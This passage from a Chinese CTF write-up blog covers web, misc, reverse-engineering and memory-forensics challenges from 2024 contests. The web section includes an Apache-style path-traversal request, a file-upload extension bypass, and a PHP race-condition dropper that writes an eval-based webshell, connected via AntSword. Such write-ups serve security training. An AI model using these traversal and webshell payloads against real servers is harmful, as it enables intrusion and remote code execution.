src="/../2024-JX-GCTF-xss-misc/image137.png"></p><p>看数据可以发现文件头是png的  89 50 4E 47 </p><p>使用一字节的逆序脚本就行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plain">hex_string = &quot;&quot;  #此处填需要逆序的十六进制<br>hex_list = hex_string.split()  # 将16进制字符串按空格分割成一个列表<br>result_list = []  # 存储转换后的结果<br><br>for num_hex in hex_list:<br>    num_int = int(num_hex, 16)  # 将16进制字符串转成10进制整数<br>    num_hex_reversed = hex(num_int)[2:].rjust(2, &#x27;0&#x27;)[::-1]  # 将10进制整数转换成16进制字符串，并反转字节<br>    result_list.append(num_hex_reversed)  # 将转换后的16进制字符串添加到结果列表中<br><br>result_str = &#x27; &#x27;.join(result_list) # 将结果列表按空格连接成一个字符串<br>print(result_str)  # 输出转换后的结果字符串<br></code></pre></td></tr></table></figure><p><img src="/../2024-JX-GCTF-xss-misc/image139.png"></p><p>得到的十六进制另存为一个新文件，再使用文件逆序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">a = open(&#x27;mnimnimnim.png&#x27;,&#x27;rb&#x27;)<br>b = open(&#x27;mnimnimnimnim.png&#x27;,&#x27;wb&#x27;)<br>b = b.write(a.read()[::-1])<br></code></pre></td></tr></table></figure><p>最后得到图片内容，</p><p><img src="/../2024-JX-GCTF-xss-misc/image141.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">goodjob<br></code></pre></td></tr></table></figure><p>得到的应该就是真的key ，除了white_space 隐写还有一种空白隐写，也就是SNOW隐写</p><p>SNOW 用于通过在行尾附加空格和制表符来隐藏 ASCII 文本中的消息，即<strong>文本隐写</strong>。由于空格和制表符在文本查看器中通常不可见，因此消息实际上对不经意的观察者隐藏。并且如果使用内置加密，即使检测到消息也无法读取。</p><p>结合我们得到的key去尝试解密</p><p><img src="/../2024-JX-GCTF-xss-misc/image143.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">GCTF&#123;this_is_s@nw&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2024年某公司内部训练赛</title>
    <link href="/2024/11/02/2024-nb-xls-qmxc/"/>
    <url>/2024/11/02/2024-nb-xls-qmxc/</url>
    
    <content type="html"><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="0x01-签到"><a href="#0x01-签到" class="headerlink" title="0x01 签到"></a>0x01 签到</h3><p><img src="/../2024-nb-xls-qmxc/image1.png"></p><p>根据题目的提示</p><p>直接读取flag文件即可</p><p><img src="/../2024-nb-xls-qmxc/image2.png"></p><p>修改请求</p><p>&#x2F;icons&#x2F;.%2e&#x2F;%2e%2e&#x2F;%2e%2e&#x2F;%2e%2e&#x2F;flag</p><p><img src="/../2024-nb-xls-qmxc/image3.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">flag&#123;205d81bf-4985-4ee2-a2a6-cdba21a368d0&#125;<br></code></pre></td></tr></table></figure><h3 id="0x02-upload"><a href="#0x02-upload" class="headerlink" title="0x02 upload"></a>0x02 upload</h3><p><img src="/../2024-nb-xls-qmxc/image4.png"></p><p><img src="/../2024-nb-xls-qmxc/image5.png"><br>上传jsp一句话木马，</p><p>对文件的后缀会进行拦截并实体化输出不执行，使用双文件名绕过</p><p>jjspsp</p><p>可以看到成功上传jsp</p><p><img src="/../2024-nb-xls-qmxc/image6.png"></p><p>访问并测试蚁剑是否连接</p><p><img src="/../2024-nb-xls-qmxc/image7.png"></p><p><img src="/../2024-nb-xls-qmxc/image8.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">flag&#123;e1b38cee-6901-4dd1-9897-40583c7ff860&#125;<br></code></pre></td></tr></table></figure><h3 id="0x03-ez-upload"><a href="#0x03-ez-upload" class="headerlink" title="0x03 ez_upload"></a>0x03 ez_upload</h3><p><img src="/../2024-nb-xls-qmxc/image9.png"></p><p><img src="/../2024-nb-xls-qmxc/image10.png"></p><p>扫描得到文件上传的路径</p><p>测试发现允许上传图片类型的文件，尝试使用条件竞争</p><p>并发上传和访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;?php <br>fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php eval($_POST[cmd])?&gt;&#x27;); <br>?&gt;<br></code></pre></td></tr></table></figure><p><img src="/../2024-nb-xls-qmxc/image11.png"></p><p><img src="/../2024-nb-xls-qmxc/image12.png"></p><p>访问shell.php</p><p><img src="/../2024-nb-xls-qmxc/image13.png"></p><p>蚁剑测试连接</p><p><img src="/../2024-nb-xls-qmxc/image14.png"></p><p><img src="/../2024-nb-xls-qmxc/image15.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">flag&#123;5dffd599-73d9-4425-9869-8bd4baa334dc&#125;<br></code></pre></td></tr></table></figure><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="0x01-flooding"><a href="#0x01-flooding" class="headerlink" title="0x01 flooding"></a>0x01 flooding</h3><p><img src="/../2024-nb-xls-qmxc/image16.png"></p><p><img src="/../2024-nb-xls-qmxc/image17.png"></p><p>观察流量可以看到传输地址处有十六进制数据，且最后两位数字都不相同，提取查看解码之后的内容</p><p><img src="/../2024-nb-xls-qmxc/image18.png"></p><p>进行base32解码，得到后半段flag</p><p><img src="/../2024-nb-xls-qmxc/image19.png"></p><p>4fc8-8aad-f42f87fcac2b}</p><p>再继续观察数据包的前段流量</p><p><img src="/../2024-nb-xls-qmxc/image20.png"></p><p><img src="/../2024-nb-xls-qmxc/image21.png"></p><p>观察两段流量后发现，再hi后面的字符有变动，将其提取</p><p>ZmxhZ3s1NTdiNjUyYi1kZDRlLQ&#x3D;&#x3D;</p><p>进行base64解码后得到前半段flag</p><p><img src="/../2024-nb-xls-qmxc/image22.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">flag&#123;557b652b-dd4e-4fc8-8aad-f42f87fcac2b&#125;<br></code></pre></td></tr></table></figure><h3 id="0x02-png-1"><a href="#0x02-png-1" class="headerlink" title="0x02 png_1"></a>0x02 png_1</h3><p><img src="/../2024-nb-xls-qmxc/image23.png"></p><p><img src="/../2024-nb-xls-qmxc/image24.png"></p><p>将十六进制放到HXD中</p><p><img src="/../2024-nb-xls-qmxc/image25.png"></p><p><img src="/../2024-nb-xls-qmxc/image26.png"></p><p>缺少了文件头，添加一个png文件头部</p><p><img src="/../2024-nb-xls-qmxc/image27.png"></p><p><img src="/../2024-nb-xls-qmxc/image28.png"></p><p>平平无奇，放到工具里显示crc报错，猜测可能修改过宽高</p><p><img src="/../2024-nb-xls-qmxc/image29.png"></p><p>使用脚本计算出原始宽高crc</p><p><img src="/../2024-nb-xls-qmxc/image30.png"></p><p><img src="/../2024-nb-xls-qmxc/image31.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">flag&#123;5730abaf-2365-4762-b228-e167769227c1&#125;<br></code></pre></td></tr></table></figure><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="0x01-apk"><a href="#0x01-apk" class="headerlink" title="0x01 apk"></a>0x01 apk</h3><p><img src="/../2024-nb-xls-qmxc/image32.png"></p><p>两个主要文件</p><p>一个是zbase32加密</p><p>另一个主函数文件为待解密密文</p><p><img src="/../2024-nb-xls-qmxc/image33.png"></p><p>c3sgn355cp1seqj1gw3skmmggo5dnmjwgy3snmjagr5u1mjigo3gcqbtg3udna3uci6o&#x3D;&#x3D;&#x3D;&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lain">https://www.dcode.fr/z-base-32-encoding<br></code></pre></td></tr></table></figure><p><img src="/../2024-nb-xls-qmxc/image34.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">flag&#123;ced9253e-f461-403a-8179-542f816f1c3e&#125;<br></code></pre></td></tr></table></figure><h3 id="0x02-xor"><a href="#0x02-xor" class="headerlink" title="0x02 xor"></a>0x02 xor</h3><p><img src="/../2024-nb-xls-qmxc/image35.png"></p><p>主代码</p><p>小端序与key异或即可</p><p><img src="/../2024-nb-xls-qmxc/image36.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plain">key = &#x27;SEcRET7&#x27;<br>enc = [0x35, 0x29, 0x02, 0x35, 0x3E, 0x35, 0x0F, 0x60,<br>0x20, 0x06, 0x64, 0x26, 0x65, 0x1A, 0x61, 0x77,<br>0x5A, 0x64, 0x68, 0x60, 0x53, 0x60, 0x20, 0x4E,<br>0x6B, 0x21, 0x67, 0x54, 0x7E, 0x71, 0x51, 0x64,<br>0x75, 0x60, 0x51, 0x64, 0x73, 0x05, 0x65, 0x21,<br>0x61, 0x4A]<br>for i in range(len(enc)):<br>    enc[i] ^= ord(key[i % 7])<br>for x in enc:<br>    print(chr(x), end=&#x27;&#x27;)<br>flag&#123;a83ee6c1-2296-4d3e-9d3c-42604f76f7d5&#125;<br></code></pre></td></tr></table></figure><h3 id="0x03-RC4"><a href="#0x03-RC4" class="headerlink" title="0x03 RC4"></a>0x03 RC4</h3><p><img src="/../2024-nb-xls-qmxc/image37.png"><br>直接将加密过后的hex进行rc解密即可</p><p><img src="/../2024-nb-xls-qmxc/image38.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">88 76 D7 7A B4 5A 4C C7 DC EF C9 8E DA 59 0E 98 8F FB 0B D4 E2 B1 13 60 E6 C7 86 2B DC 71 D4 30 ED 2A 89 61 83 80 28 F2 92 E2<br>The quick brown fox jumps over a lazy dog.<br></code></pre></td></tr></table></figure><p><img src="/../2024-nb-xls-qmxc/image39.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">flag&#123;c8fd99f1-841a-44c9-8d38-746db6ff95c1&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2024年江西省“振兴杯”职业技能大赛信息安全测试员(渗透测试员)赛项 Misc-wp</title>
    <link href="/2024/10/27/2024-JX-ZXB-stcsy-misc/"/>
    <url>/2024/10/27/2024-JX-ZXB-stcsy-misc/</url>
    
    <content type="html"><![CDATA[<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h4 id="0x01-haveflag2"><a href="#0x01-haveflag2" class="headerlink" title="0x01 haveflag2"></a>0x01 haveflag2</h4><p><img src="/../2024-JX-ZXB-stcsy-misc/image.png"></p><p>发现http流量中有压缩包，导出http</p><p><img src="/../2024-JX-ZXB-stcsy-misc/image1.png"></p><p>分析压缩包，无密码解压得到一张图片和一个word文档</p><p>先对文档分析，空白的，全选设置字体为红色得到一串字符</p><p><img src="/../2024-JX-ZXB-stcsy-misc/image2.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">FGsdtu89$<br></code></pre></td></tr></table></figure><p>word文档分析没有其他东西再转向图片文件分析</p><p>分析到图片尾部发现图片中还有个压缩包，而压缩包的内容为另一张png图片</p><p><img src="/../2024-JX-ZXB-stcsy-misc/image3.png"></p><p>将内容复制出来，或者使用工具对其进行分离</p><p><img src="/../2024-JX-ZXB-stcsy-misc/image4.png"></p><p>搜索png图片的文件尾部</p><p>从PK压缩包头部50 4B开始复制另存为一个新文件</p><p><img src="/../2024-JX-ZXB-stcsy-misc/image5.png"></p><p><img src="/../2024-JX-ZXB-stcsy-misc/image6.png"></p><p>可以看到压缩包有加密</p><p><img src="/../2024-JX-ZXB-stcsy-misc/image7.png"></p><p>这时候可以用到word文档中的那串字符尝试进行解密</p><p>尝试解密发现就是压缩包的密码</p><p><img src="/../2024-JX-ZXB-stcsy-misc/image8.png"></p><p>得到一张二维码，使用CQR二维码解码工具进行扫描</p><p><img src="/../2024-JX-ZXB-stcsy-misc/image9.png"></p><p>得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">flag&#123;fjgnc59TJoomcewmzrr0vnsmi&#125;<br></code></pre></td></tr></table></figure><h4 id="0x02-文字文稿1"><a href="#0x02-文字文稿1" class="headerlink" title="0x02 文字文稿1"></a>0x02 文字文稿1</h4><p><img src="/../2024-JX-ZXB-stcsy-misc/image10.png"></p><p>拿到题目附件</p><p><img src="/../2024-JX-ZXB-stcsy-misc/image11.png"></p><p>发现有一句诗，全选一下设置字体为红色</p><p><img src="/../2024-JX-ZXB-stcsy-misc/image12.png"><br>可以发现word文档底部还有一串摩斯电码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">..--- -.-. ....- ----- ....<br></code></pre></td></tr></table></figure><p><img src="/../2024-JX-ZXB-stcsy-misc/image13.png"></p><p>使用工具解码后得到一串字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">2C40H<br></code></pre></td></tr></table></figure><p>这时候想到去分析文件的数据</p><p><img src="/../2024-JX-ZXB-stcsy-misc/image14.png"></p><p>可以看到文件中有txt文本，还有一串base编码</p><p>，我们先对base编码进行解码操作，base64解码</p><p><img src="/../2024-JX-ZXB-stcsy-misc/image15.png"></p><p>得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">flag&#123;rlnujmbsf4d19ytoexi0wpgq7czh82v3&#125;<br></code></pre></td></tr></table></figure><p>这时候想继续去分析一下txt文件，使用工具对word文档进行分离</p><p><img src="/../2024-JX-ZXB-stcsy-misc/image16.png"></p><p><img src="/../2024-JX-ZXB-stcsy-misc/image17.png"></p><p>解压查看txt文件内容</p><p><img src="/../2024-JX-ZXB-stcsy-misc/image18.png"></p><p>文件大小为0</p><p>可能正是和文本文件的名字一样，用来误导ctfer的，所以说做题的时候还是需要仔细分析，如果真到山穷水尽的时候不妨回头看看</p><h4 id="0x03-aaa"><a href="#0x03-aaa" class="headerlink" title="0x03 aaa"></a>0x03 aaa</h4><p><img src="/../2024-JX-ZXB-stcsy-misc/image19.png"></p><p>拿到内存镜像，使用vol分析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">./volatility_2.6 -f aaa.raw imageinfo<br></code></pre></td></tr></table></figure><p><img src="/../2024-JX-ZXB-stcsy-misc/image20.png"></p><p>使用filescan插件进行筛选</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">./volatility_2.6 -f aaa.raw --profile=Win7SP1x64 filescan | grep -E &quot;txt|zip|flag&quot;<br></code></pre></td></tr></table></figure><p><img src="/../2024-JX-ZXB-stcsy-misc/image21.png"></p><p>搭配grep筛选包含关键字的内容</p><p>可以看到得到一个名为fll4g的zip压缩包</p><p>我们导出一下压缩包文件进行分析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">./volatility_2.6 -f aaa.raw --profile=Win7SP1x64 dumpfiles -Q 0x00000000144b5590 -D ./<br></code></pre></td></tr></table></figure><p><img src="/../2024-JX-ZXB-stcsy-misc/image22.png"></p><p><img src="/../2024-JX-ZXB-stcsy-misc/image23.png"></p><p>文件加密，经过一番查找并未得到有关密码的内容，</p><p>现在只剩下俩个办法，对压缩包进行暴力破解   （X）</p><p>对内存镜像的用户密码进行破解</p><p><code>Passware Kit Forensic</code></p><p>使用到这个工具</p><p><img src="/../2024-JX-ZXB-stcsy-misc/image24.png"></p><p>在主页选择内存分析</p><p><img src="/../2024-JX-ZXB-stcsy-misc/image25.png"></p><p>选择好镜像后直接下一步，剩下的就是耐心等待</p><p><img src="/../2024-JX-ZXB-stcsy-misc/image26.png"></p><p>得到admin用户的密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">P@55w0rd!<br></code></pre></td></tr></table></figure><p>尝试使用这个密码对压缩包进行解压，发现是正确的密码</p><p><img src="/../2024-JX-ZXB-stcsy-misc/image27.png"></p><p>得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">flag&#123;64cf9601989168f7ced3aeea9064c411&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
